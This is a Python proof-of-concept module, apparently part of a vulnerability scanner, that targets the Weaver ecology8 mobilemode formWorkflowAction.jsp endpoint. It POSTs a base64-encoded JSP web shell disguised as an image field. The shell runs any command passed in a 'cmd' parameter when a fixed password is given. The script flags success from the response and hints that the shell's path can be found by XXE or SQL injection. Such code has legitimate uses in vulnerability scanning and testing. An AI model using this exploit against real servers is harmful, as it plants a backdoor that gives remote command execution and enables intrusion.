#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology8 mobilemode getshell'
        self.keyword = ['ecology8', 'getshell']
        self.info = 'ecology8 mobilemode getshell'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path +"mobilemode/formWorkflowAction.jsp"
                    data = 'action=createWorkflow&fieldname_photo=data%3Aimage%2Fjsp%3Bbase64%2CPCUKICAgIGlmKCJjb25maWciLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsKICAgICAgICBieXRlW10gYiA9IG5ldyBieXRlWzIwNDhdOwogICAgICAgIG91dC5wcmludCgiPHByZT4iKTsKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsKICAgICAgICB9CiAgICAgICAgb3V0LnByaW50KCI8L3ByZT4iKTsKICAgIH0KJT4%3D&type_photo=photo&workflowid=zzz&workflowtitle=zzz&datasource=xxx&tablename=xxx'

                    async with session.post(url=url, data=data) as res:
                        if res != None:
                            text = await res.text()
                            if '"status":"0"' in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": "you should look for url by xxe or sql " + '?pwd=whoami', "key": "ecology8 getshell"})
                                return